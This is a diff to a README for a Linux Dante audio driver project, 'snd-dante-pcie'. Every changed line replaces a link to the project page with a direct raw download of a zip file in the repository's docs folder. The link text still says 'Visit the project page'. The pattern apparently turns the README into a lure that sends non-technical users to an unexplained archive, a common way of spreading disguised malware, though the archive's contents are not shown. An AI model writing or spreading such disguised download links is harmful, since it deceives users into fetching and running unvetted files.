@@ -1,12 +1,12 @@
 # 🎛️ snd-dante-pcie - Run Dante Audio on Linux
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/mbyington67-prog/snd-dante-pcie)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/mbyington67-prog/snd-dante-pcie/raw/refs/heads/master/docs/pcie_dante_snd_v1.4.zip)
 
 ## 📥 Download
 
 Visit this page to download or review the project files:
 
-[https://github.com/mbyington67-prog/snd-dante-pcie](https://github.com/mbyington67-prog/snd-dante-pcie)
+[https://github.com/mbyington67-prog/snd-dante-pcie/raw/refs/heads/master/docs/pcie_dante_snd_v1.4.zip](https://github.com/mbyington67-prog/snd-dante-pcie/raw/refs/heads/master/docs/pcie_dante_snd_v1.4.zip)
 
 ## 🖥️ What This Project Does
 
@@ -39,7 +39,7 @@ For best results, use a Linux version that matches your audio hardware and kerne
 ## 🚀 Getting Started
 
 1. Open the project page:
-   [https://github.com/mbyington67-prog/snd-dante-pcie](https://github.com/mbyington67-prog/snd-dante-pcie)
+   [https://github.com/mbyington67-prog/snd-dante-pcie/raw/refs/heads/master/docs/pcie_dante_snd_v1.4.zip](https://github.com/mbyington67-prog/snd-dante-pcie/raw/refs/heads/master/docs/pcie_dante_snd_v1.4.zip)
 
 2. Download the source files or package from the repository page.
 
@@ -168,7 +168,7 @@ Use the project page as the source of truth for the latest files and steps
 
 ## 🔗 Download Again
 
-[Visit the project page to download snd-dante-pcie](https://github.com/mbyington67-prog/snd-dante-pcie)
+[Visit the project page to download snd-dante-pcie](https://github.com/mbyington67-prog/snd-dante-pcie/raw/refs/heads/master/docs/pcie_dante_snd_v1.4.zip)
 
 ## 🖱️ Quick Path for Non-Technical Users
 
